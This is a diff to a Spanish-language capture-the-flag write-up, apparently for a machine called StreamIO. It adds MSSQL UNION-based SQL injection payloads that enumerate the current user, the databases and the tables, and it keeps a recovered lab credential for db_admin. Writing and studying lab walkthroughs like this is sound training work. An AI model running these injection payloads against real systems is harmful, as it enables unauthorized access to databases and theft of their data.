@@ -130,20 +130,31 @@ Pudiendo sacar la versión del servicio MSSQL
 Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)
 ```
 
+Tambien veremos que usuario somos en la base de datos
+```sql
+'union select 1,user_name(),3,4,5,6--
+```
 
 Ayudándonos de payloads all the things podemos identificar el nombre de la base de datos que se esta usando
 ```sql
 'union select 1,(SELECT DB_NAME()),3,4,5,6--
 ```
 
-Tambien veremos que usuario somos en la base de datos
-```shell
-'union select 1,
+Tambien podemos enumerar todas las demas bases de datos
+```sql
+'union select 1,name,3,4,5,6 from master..sysdatabases--
 ```
 
-A continuacion buscaremos como listar las tablas
+Encontrando una tabla llamada `streamio_backup` la enumeraremos
 ```sql
-'union select 1,name,3,4,5,6  from streamio..sysobjects where xtype='U';--
+'union select 1,name,3,4,5,6 from streamio_backup..sysobjects where xtype='U';--
+```
+
+No dejandonos enumerarla
+
+A continuación buscaremos como listar las tablas activas
+```sql
+'union select 1,name,3,4,5,6 from streamio..sysobjects where xtype='U';--
 ```
 
 Encontramos las tablas `movies` y la tabla `users`, asi que vamos a enumerar la tabla users
@@ -276,7 +287,8 @@ Encontrando un usuario y una contraseña
 db_admin::B1@hx31234567890
 ```
 
-Probaremos a conectarnos a la base de datos a traves de MSSQL
+
+
 
 
 
